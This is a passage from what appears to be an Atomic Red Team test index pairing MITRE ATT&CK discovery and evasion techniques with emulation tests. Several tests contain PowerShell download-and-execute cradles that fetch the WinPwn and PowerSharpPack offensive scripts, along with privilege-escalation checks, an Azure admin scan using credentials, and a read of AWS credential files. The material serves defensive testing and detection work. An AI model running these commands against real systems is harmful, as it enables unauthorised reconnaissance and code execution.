          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          Generalrecon -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - Morerecon
      auto_generated_guid: 3278b2f6-f733-4875-9ef4-bfed34244f0a
      description: Gathers local system information using the Morerecon function of
        WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          Morerecon -noninteractive -consoleoutput
        name: powershell
    - name: WinPwn - RBCD-Check
      auto_generated_guid: dec6a0d8-bcaf-4c22-9d48-2aee59fb692b
      description: Search for Resource-Based Constrained Delegation attack paths using
        RBCD-Check function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          RBCD-Check -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - PowerSharpPack - Watson searching for missing windows patches
      auto_generated_guid: 07b18a66-6304-47d2-bad0-ef421eb2e107
      description: PowerSharpPack - Watson searching for missing windows patches  technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
          Invoke-watson
        name: powershell
    - name: WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
      auto_generated_guid: efb79454-1101-4224-a4d0-30c9c8b29ffc
      description: PowerSharpPack - Sharpup checking common Privesc vectors technique
        via function of WinPwn - Takes several minutes to complete.
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')
          Invoke-SharpUp -command "audit"
        name: powershell
    - name: WinPwn - PowerSharpPack - Seatbelt
      auto_generated_guid: 5c16ceb4-ba3a-43d7-b848-a13c1f216d95
      description: |-
        PowerSharpPack - Seatbelt technique via function of WinPwn.

        [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.
      supported_platforms:
      - windows
      executor:
        command: |-
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')
          Invoke-Seatbelt -Command "-group=all"; pause
        name: powershell
    - name: Azure Security Scan with SkyArk
      auto_generated_guid: 26a18d3d-f8bc-486b-9a33-d6df5d78a594
      description: "Upon successful execution, this test will utilize a valid read-only
        Azure AD user's credentials to conduct a security scan and determine what
        users exist in a given tenant, as well as identify any admin users. \nOnce
        the test is complete, a folder will be output to the temp directory that contains
        3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk
        \n"
      supported_platforms:
      - azure-ad
      input_arguments:
        username:
          description: Azure AD username
          type: string
          default: 
        password:
          description: Azure AD password
          type: string
          default: T1082Az
      dependency_executor_name: powershell
      dependencies:
      - description: 'The SkyArk AzureStealth module must exist in $env:temp.

          '
        prereq_command: 'if (test-path $env:temp\AzureStealth.ps1){exit 0} else {exit
          1}

          '
        get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1"
          -outfile "$env:temp\AzureStealth.ps1"

          '
      - description: 'The AzureAD module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name AzureAD -Force

          '
      - description: 'The Az module must be installed.

          '
        prereq_command: 'try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue)
          {exit 0} else {exit 1}} catch {exit 1}

          '
        get_prereq_command: 'Install-Module -Name Az -Force

          '
      executor:
        command: "Import-Module $env:temp\\AzureStealth.ps1 -force      \n$Password
          = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential
          = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList
          \"#{username}\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD
          -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n"
        cleanup_command: |
          $resultstime = Get-Date -Format "yyyyMMdd"
          $resultsfolder = ("Results-" + $resultstime)
          remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue
        name: powershell
        elevation_required: true
    - name: Linux List Kernel Modules
      auto_generated_guid: 034fe21c-3186-49dd-8d5d-128b35f181c7
      description: 'Enumerate kernel modules installed 3 different ways. Upon successful
        execution stdout will display kernel modules installed on host 2 times, followed
        by list of modules matching ''vmw'' if present.

        '
      supported_platforms:
      - linux
      executor:
        command: |
          lsmod
          kmod list
          grep vmw /proc/modules
        name: sh
    - name: System Information Discovery with WMIC
      auto_generated_guid: 8851b73a-3624-4bf7-8704-aa312411565c
      description: |
        Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.
        https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
        Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:
        https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
        https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
      supported_platforms:
      - windows
      executor:
        command: |
          wmic cpu get name
          wmic MEMPHYSICAL get MaxCapacity
          wmic baseboard get product
          wmic baseboard get version
          wmic bios get SMBIOSBIOSVersion
          wmic path win32_VideoController get name
          wmic path win32_VideoController get DriverVersion
          wmic path win32_VideoController get VideoModeDescription
          wmic OS get Caption,OSArchitecture,Version
          wmic DISKDRIVE get Caption
        name: command_prompt
  T1010:
    technique:
      modified: '2023-04-15T16:46:04.776Z'
      name: Application Window Discovery
      description: |-
        Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)

        Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_deprecated: false
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - macOS
      - Windows
      - Linux
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: OS API Execution'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830
      created: '2017-05-31T21:30:24.512Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1010
        external_id: T1010
      - source_name: ESET Grandoreiro April 2020
        description: 'ESET. (2020, April 28). Grandoreiro: How engorged can an EXE
          get?. Retrieved November 13, 2020.'
        url: https://www.welivesecurity.com/2020/04/28/grandoreiro-how-engorged-can-exe-get/
      - source_name: Prevailion DarkWatchman 2021
        description: 'Smith, S., Stafford, M. (2021, December 14). DarkWatchman: A
          new evolution in fileless techniques. Retrieved January 10, 2022.'
        url: https://www.prevailion.com/darkwatchman-new-fileless-techniques/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1010
    atomic_tests:
    - name: List Process Main Windows - C# .NET
      auto_generated_guid: fe94a1c3-3e22-4dc9-9fdf-3a8bdbc10dc4
      description: |
        Compiles and executes C# code to list main window titles associated with each process.

        Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.
      supported_platforms:
      - windows
      input_arguments:
        input_source_code:
          description: Path to source of C# code
          type: path
          default: PathToAtomicsFolder\T1010\src\T1010.cs
        output_file_name:
          description: Name of output binary
          type: string
          default: "%TEMP%\\T1010.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'T1010.cs must exist on disk at specified location (#{input_source_code})

          '
        prereq_command: 'if (Test-Path #{input_source_code}) {exit 0} else {exit 1}

          '
        get_prereq_command: |
          New-Item -Type Directory (split-path #{input_source_code}) -ErrorAction ignore | Out-Null
          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1010/src/T1010.cs -OutFile "#{input_source_code}"
      executor:
        command: |
          C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:#{output_file_name} #{input_source_code}
          #{output_file_name}
        cleanup_command: 'del /f /q /s #{output_file_name} >nul 2>&1

          '
        name: command_prompt
  T1087.003:
    technique:
      x_mitre_platforms:
      - Windows
      - Office 365
      - Google Workspace
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4bc31b94-045b-4752-8920-aebaebdb6470
      type: attack-pattern
      created: '2020-02-21T21:08:33.237Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1087.003
        url: https://attack.mitre.org/techniques/T1087/003
      - source_name: Microsoft Exchange Address Lists
        url: https://docs.microsoft.com/en-us/exchange/email-addresses-and-address-books/address-lists/address-lists?view=exchserver-2019
        description: Microsoft. (2020, February 7). Address lists in Exchange Server.
          Retrieved March 26, 2020.
      - source_name: Microsoft getglobaladdresslist
        url: https://docs.microsoft.com/en-us/powershell/module/exchange/email-addresses-and-address-books/get-globaladdresslist
        description: Microsoft. (n.d.). Get-GlobalAddressList. Retrieved October 6,
          2019.
      - description: Bullock, B.. (2016, October 3). Attacking Exchange with MailSniper.
          Retrieved October 6, 2019.
        url: https://www.blackhillsinfosec.com/attacking-exchange-with-mailsniper/
        source_name: Black Hills Attacking Exchange MailSniper, 2016
      - source_name: Google Workspace Global Access List
        url: https://support.google.com/a/answer/166870?hl=en
        description: Google. (n.d.). Retrieved March 16, 2021.
      modified: '2021-03-31T13:10:46.302Z'
      name: Email Account
      description: |-
        Adversaries may attempt to get a listing of email addresses and accounts. Adversaries may try to dump Exchange address lists such as global address lists (GALs).(Citation: Microsoft Exchange Address Lists)

        In on-premises Exchange and Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet can be used to obtain email addresses and accounts from a domain using an authenticated session.(Citation: Microsoft getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)

        In Google Workspace, the GAL is shared with Microsoft Outlook users through the Google Workspace Sync for Microsoft Outlook (GWSMO) service. Additionally, the Google Workspace Directory allows for users to get a listing of other users within the organization.(Citation: Google Workspace Global Access List)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: |-
        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

        Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
    atomic_tests: []
  T1497.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jorge Orchilles, SCYTHE
      - Ruben Dodge, @shotgunner101
      - Jeff Felling, Red Canary
      - Deloitte Threat Library Team
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0
      type: attack-pattern
      created: '2020-03-06T21:11:11.225Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1497.003
        url: https://attack.mitre.org/techniques/T1497/003
      - source_name: Deloitte Environment Awareness
        url: https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc
        description: Torello, A. & Guibernau, F. (n.d.). Environment Awareness. Retrieved
          May 18, 2021.
      - source_name: Revil Independence Day
        url: https://news.sophos.com/en-us/2021/07/04/independence-day-revil-uses-supply-chain-exploit-to-attack-hundreds-of-businesses/
        description: 'Loman, M. et al. (2021, July 4). Independence Day: REvil uses
          supply chain exploit to attack hundreds of businesses. Retrieved September
          30, 2021.'
      - source_name: Netskope Nitol
        url: https://www.netskope.com/blog/nitol-botnet-makes-resurgence-evasive-sandbox-analysis-technique
        description: Malik, A. (2016, October 14). Nitol Botnet makes a resurgence
          with evasive sandbox analysis technique. Retrieved September 30, 2021.
      - source_name: Joe Sec Nymaim
        url: https://www.joesecurity.org/blog/3660886847485093803
        description: Joe Security. (2016, April 21). Nymaim - evading Sandboxes with
          API hammering. Retrieved September 30, 2021.
      - source_name: Joe Sec Trickbot
        url: https://www.joesecurity.org/blog/498839998833561473
        description: Joe Security. (2020, July 13). TrickBot's new API-Hammering explained.
          Retrieved September 30, 2021.
      - source_name: ISACA Malware Tricks
        url: https://www.isaca.org/resources/isaca-journal/issues/2017/volume-6/evasive-malware-tricks-how-malware-evades-detection-by-sandboxes
        description: 'Kolbitsch, C. (2017, November 1). Evasive Malware Tricks: How
          Malware Evades Detection by Sandboxes. Retrieved March 30, 2021.'
      modified: '2021-10-15T22:37:43.854Z'
      name: Time Based Evasion
      description: |-
        Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.

        Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)

        Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)

        Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_detection: 'Time-based evasion will likely occur in the first steps
        of an operation but may also occur throughout as an adversary learns the environment.
        Data and events should not be viewed in isolation, but as part of a chain
        of behavior that could lead to other activities, such as lateral movement,
        based on the information obtained. Detecting actions related to virtualization
        and sandbox identification may be difficult depending on the adversary''s
        implementation and monitoring required. Monitoring for suspicious processes
        being spawned that gather a variety of system information or perform other
        forms of Discovery, especially in a short period of time, may aid in detection. '
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Process: OS API Execution'
      x_mitre_defense_bypassed:
      - Host forensic analysis
      - Signature-based detection
      - Static File Analysis
      - Anti-virus
    atomic_tests: []
  T1580:
    technique:
      x_mitre_platforms:
      - IaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Regina Elwell
      - Praetorian
      - Isif Ibrahima, Mandiant
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d
      created: '2020-08-20T17:51:25.671Z'
      x_mitre_version: '1.3'
      external_references:
      - source_name: mitre-attack
        external_id: T1580
        url: https://attack.mitre.org/techniques/T1580
      - source_name: Expel IO Evil in AWS
        url: https://expel.io/blog/finding-evil-in-aws/
        description: A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding
          Evil in AWS. Retrieved June 25, 2020.
      - source_name: AWS Head Bucket
        url: https://docs.aws.amazon.com/AmazonS3/latest/API/API_HeadBucket.html
        description: Amazon Web Services. (n.d.). AWS HeadBucket. Retrieved February
          14, 2022.
      - source_name: AWS Get Public Access Block
        url: https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetPublicAccessBlock.html
        description: Amazon Web Services. (n.d.). Retrieved May 28, 2021.
      - source_name: AWS Describe DB Instances
        url: https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBInstances.html
        description: Amazon Web Services. (n.d.). Retrieved May 28, 2021.
      - source_name: Amazon Describe Instance
        url: https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html
        description: Amazon. (n.d.). describe-instance-information. Retrieved March
          3, 2020.
      - source_name: Amazon Describe Instances API
        url: https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstances.html
        description: Amazon. (n.d.). DescribeInstances. Retrieved May 26, 2020.
      - source_name: Google Compute Instances
        url: https://cloud.google.com/sdk/gcloud/reference/compute/instances/list
        description: Google. (n.d.). gcloud compute instances list. Retrieved May
          26, 2020.
      - source_name: Mandiant M-Trends 2020
        url: https://content.fireeye.com/m-trends/rpt-m-trends-2020
        description: Mandiant. (2020, February). M-Trends 2020. Retrieved April 24,
          2020.
      - source_name: Microsoft AZ CLI
        url: https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest
        description: Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.
      - source_name: Malwarebytes OSINT Leaky Buckets - Hioureas
        url: https://blog.malwarebytes.com/researchers-corner/2019/09/hacking-with-aws-incorporating-leaky-buckets-osint-workflow/
        description: 'Vasilios Hioureas. (2019, September 13). Hacking with AWS: incorporating
          leaky buckets into your OSINT workflow. Retrieved February 14, 2022.'
      x_mitre_deprecated: false
      revoked: false
      description: |-
        An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.

        Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <code>DescribeInstances</code> API within the Amazon EC2 API that can return information about one or more instances within an account, the <code>ListBuckets</code> API that returns a list of all buckets owned by the authenticated sender of the request, the <code>HeadBucket</code> API to determine a bucket’s existence along with access permissions of the request sender, or the <code>GetPublicAccessBlock</code> API to retrieve access block configuration for a bucket.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API)(Citation: AWS Get Public Access Block)(Citation: AWS Head Bucket) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list</code> command to list all Google Compute Engine instances in a project (Citation: Google Compute Instances), and Azure's CLI command <code>az vm list</code> lists details of virtual machines.(Citation: Microsoft AZ CLI) In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003).(Citation: Malwarebytes OSINT Leaky Buckets - Hioureas)

        An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020)An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as <code>DescribeDBInstances</code> to determine size, owner, permissions, and network ACLs of database resources. (Citation: AWS Describe DB Instances) Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in [Cloud Service Discovery](https://attack.mitre.org/techniques/T1526), this technique focuses on the discovery of components of the provided services rather than the services themselves.
      modified: '2022-04-20T19:03:12.977Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Cloud Infrastructure Discovery
      x_mitre_detection: Establish centralized logging for the activity of cloud infrastructure
        components. Monitor logs for actions that could be taken to gather information
        about cloud infrastructure, including the use of discovery API calls by new
        or unexpected users and enumerations from unknown or malicious IP addresses.
        To reduce false positives, valid change management procedures could introduce
        a known identifier that is logged with the change (e.g., tag or header) if
        supported by the cloud provider, to help distinguish valid, expected actions
        from malicious ones.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Volume: Volume Enumeration'
      - 'Snapshot: Snapshot Enumeration'
      - 'Cloud Storage: Cloud Storage Enumeration'
      - 'Instance: Instance Enumeration'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1580
    atomic_tests:
    - name: AWS - EC2 Enumeration from Cloud Instance
      auto_generated_guid: 99ee161b-dcb1-4276-8ecb-7cfdcb207820
      description: 'This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets,
        iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails,
        ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors)
        from the context of an EC2 instance role. This simulates an attacker compromising
        an EC2 instance and running initial discovery commands on it. This atomic
        test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team).
        Stratus Red Team is a self-contained binary. You can use it to easily detonate
        offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        stratus_path:
          description: Path of stratus binary
          type: path
          default: "$PathToAtomicsFolder/T1580/src"
        aws_region:
          description: AWS region to detonate
          type: string
          default: us-west-2
      dependency_executor_name: sh
      dependencies:
      - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)

          '
        prereq_command: 'if test -f "#{stratus_path}/stratus"; then exit 0; else exit
          1; fi

          '
        get_prereq_command: "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
          -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
          | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4);
          wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n
          \ tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif
          [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen DOWNLOAD_URL=$(curl
          -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
          | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4);
          wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n
          \ tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi
          \n"
      - description: 'Check if ~/.aws/credentials file has a default stanza is configured

          '
        prereq_command: 'cat ~/.aws/credentials | grep "default"

          '
        get_prereq_command: 'echo "Please install the aws-cli and configure your AWS
          default profile using: aws configure"

          '
      executor:
        command: |
          export AWS_REGION=#{aws_region}
          cd #{stratus_path}
          echo "Stratus: Start Warmup."
          ./stratus warmup aws.discovery.ec2-enumerate-from-instance
          echo "Stratus: Start Detonate."
          ./stratus detonate aws.discovery.ec2-enumerate-from-instance
        cleanup_command: |
          cd #{stratus_path}
          echo "Stratus: Start Cleanup."
          ./stratus cleanup aws.discovery.ec2-enumerate-from-instance
          echo "Removing Stratus artifacts from local machine."
          rm -rf stratus*
        name: sh
        elevation_required: false
  T1217:
    technique:
      modified: '2023-04-16T14:24:40.625Z'
      name: Browser Bookmark Discovery
      description: |-
        Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)

        Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.

        Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: discovery
      x_mitre_contributors:
      - Mike Kemmerer
      - Manikantan Srinivasan, NEC Corporation India
      - Yinon Engelsman, Talon Cyber Security
      - Yonatan Gotlib, Talon Cyber Security
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor processes and command-line arguments for actions that could be taken to gather browser bookmark information. Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_version: '2.0'
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'File: File Access'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1217
        external_id: T1217
      - source_name: Chrome Roaming Profiles
        description: Chrome Enterprise and Education Help. (n.d.). Use Chrome Browser
          with Roaming User Profiles. Retrieved March 28, 2023.
        url: https://support.google.com/chrome/a/answer/7349337
      - source_name: Kaspersky Autofill
        description: Golubev, S. (n.d.). How malware steals autofill data from browsers.
          Retrieved March 28, 2023.
        url: https://www.kaspersky.com/blog/browser-data-theft/27871/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1217
    atomic_tests:
    - name: List Mozilla Firefox Bookmark Database Files on Linux
      auto_generated_guid: 3a41f169-a5ab-407f-9269-abafdb5da6c2
      description: 'Searches for Mozilla Firefox''s places.sqlite file (on Linux distributions)
        that contains bookmarks and lists any found instances to a text file.

        '
      supported_platforms:
      - linux
      input_arguments:
        output_file:
          description: Path where captured results will be placed.
          type: path
          default: "/tmp/T1217-Firefox.txt"
      executor:
        command: |
          find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> #{output_file} \;
          cat #{output_file} 2>/dev/null
        cleanup_command: 'rm -f #{output_file} 2>/dev/null

          '
        name: sh
    - name: List Mozilla Firefox Bookmark Database Files on macOS
      auto_generated_guid: 1ca1f9c7-44bc-46bb-8c85-c50e2e94267b
      description: 'Searches for Mozilla Firefox''s places.sqlite file (on macOS)
        that contains bookmarks and lists any found instances to a text file.

        '
      supported_platforms:
      - macos
      input_arguments:
        output_file:
          description: Path where captured results will be placed.
          type: path
          default: "/tmp/T1217_Firefox.txt"
      executor:
        command: |
          find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> #{output_file} \;
          cat #{output_file} 2>/dev/null
        cleanup_command: 'rm -f #{output_file} 2>/dev/null

